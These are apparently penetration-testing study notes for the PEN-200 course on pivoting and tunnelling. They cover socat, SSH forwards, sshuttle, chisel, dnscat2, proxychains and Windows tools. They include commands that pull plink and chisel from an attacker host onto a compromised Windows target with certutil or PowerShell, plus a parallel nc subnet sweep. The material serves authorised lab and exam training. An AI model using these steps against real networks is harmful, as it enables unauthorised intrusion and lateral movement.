# Port Redirection & Tunnelling

Pivoting playbook for standalone boxes. Notes here template with **BoxHelper.html**
(`{{LHOST}}`, `{{TARGET_IP}}`, `{{USERNAME}}`, `{{PASSWORD}}`, `{{LPORT}}`, …). Non-brace
placeholders `<PIVOT_IP>` / `<DEEP_IP>` name the hops of the pivot chain (see the legend in
[tunnelling.md](tunnelling.md)).

- [tunnelling.md](tunnelling.md) — PEN-200 Module 19 (Port Redirection and SSH Tunneling): socat, `ssh -L/-D/-R` + remote-dynamic, sshuttle, and the Windows tools ssh.exe/plink/netsh — and Module 20 (Tunneling Through Deep Packet Inspection): HTTP tunnelling with chisel + DNS tunnelling with dnscat2.

> **The one rule:** pick the technique from the *constraint*, not habit — can Kali connect **in**
> to the pivot, or must the pivot connect **out** to Kali? That single question chooses `-L`/`-D`
> vs `-R`. Layer on "whole subnet?" (→ `-D`+proxychains / sshuttle) and "DPI HTTP/DNS-only?"
> (→ chisel / dnscat2).

---

## 0 · Toolbox — set this up *before* the exam

**Install on Kali** (so the binaries/servers are ready when you need them):

```bash
sudo apt update
sudo apt install -y chisel proxychains4 sshuttle socat openssh-server dnscat2   # core pivoting kit
# proxychains4 config lives at /etc/proxychains4.conf — edit the last [ProxyList] line per tunnel
# openssh-server gives you `sudo systemctl start ssh` for any -R / reverse tunnel back to Kali
```

> If a package is missing on your build: `chisel` → grab the release binary from
> github.com/jpillora/chisel; `dnscat2` → github.com/iagox86/dnscat2 (server is Ruby: `gem install`).
> Confirm each is on PATH: `which chisel proxychains4 sshuttle socat`.

**Stage for Windows targets** — copy these to a folder you serve over HTTP (`/var/www/html/`, then
`sudo systemctl start apache2`) so a foothold can `wget`/`certutil` them down:

| File | Where it ships on Kali | Why you copy it to the target |
|---|---|---|
| `chisel.exe` (Windows build) | download from the chisel releases page | reverse-SOCKS pivot from a Windows box through DPI |
| `plink.exe` | `/usr/share/windows-resources/binaries/plink.exe` | SSH `-R` from legacy Windows with no OpenSSH |
| `nc.exe` | `/usr/share/windows-resources/binaries/nc.exe` | quick relays / shells alongside the tunnel |
| (`ssh.exe` / `netsh`) | **already on modern Windows** — nothing to copy | native forward + portproxy, see tunnelling.md §C.1/§C.3 |

```bash
# typical staging + target-side pull
sudo cp $(which chisel) /var/www/html/                       # linux chisel for a *nix pivot
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
sudo systemctl start apache2
#  on the target:
#   powershell wget -Uri http://<KALI>/plink.exe -OutFile C:\Windows\Temp\plink.exe
#   certutil -urlcache -f http://<KALI>/chisel.exe C:\Windows\Temp\chisel.exe   (fallback)
```

---

## 1 · Enumerate the pivot before you tunnel

The moment you get a shell on a dual-homed host, map what it can see — that defines every tunnel.

```bash
ip addr; ip route            # second interface / extra subnet = your pivot path
ss -ntplu                    # local-only services now reachable via a forward
# sweep the new subnet — quiet (only hits) + parallel (whole /24 in seconds):
seq 1 254 | xargs -P64 -I{} sh -c 'nc -zw1 <NEWNET>.{} 445 2>/dev/null && echo "<NEWNET>.{}:445 up"'
# from Kali over a -D/chisel SOCKS instead of on the pivot: prefix the nc with `proxychains -q`
```

## 2 · Choose the forward

| Situation | Technique | §  |
|---|---|---|
| Kali can connect **inbound** to the pivot; want **one** service | `ssh -L` or **socat** | B.1 / A |
| …want **any** host:port the next hop sees | `ssh -D` + proxychains | B.2 |
| **Inbound blocked**, pivot can reach **out** to Kali; one service | `ssh -R` (start `sshd` on Kali) | B.3 |
| …inbound blocked, want a **whole subnet** | `ssh -R <port>` (remote-dynamic) + proxychains | B.4 |
| Clean SSH access, want **subnets transparently** (no proxychains) | **sshuttle** | B.5 |
| Pivot is **Windows** | ssh.exe / plink / netsh | C |
| DPI allows **HTTP** only | **chisel** (reverse SOCKS on Kali :1080) | D.1 |
| DPI allows **DNS** only | **dnscat2** (`listen` = `ssh -L` over DNS) | D.2 |

## 3 · proxychains & gotchas

- Edit `/etc/proxychains4.conf` → last line `socks5 <ip> <port>`; **one** proxy at a time.
- SOCKS is **TCP-only**: nmap through it must be `-sT -Pn` (no SYN/UDP/ICMP). Expect it to be slow.
- **Bind `0.0.0.0`** on a forward when a *third* box (Kali) must reach it — defaults are loopback-only.
- Mnemonic: the flag names the side the **listening port opens on** — `-L`/`-D` = your side, `-R` = the far side.
- **Clean up** persistent state: `netsh` portproxy + firewall rules survive reboots; kill backgrounded `chisel`/`ssh -f` procs.
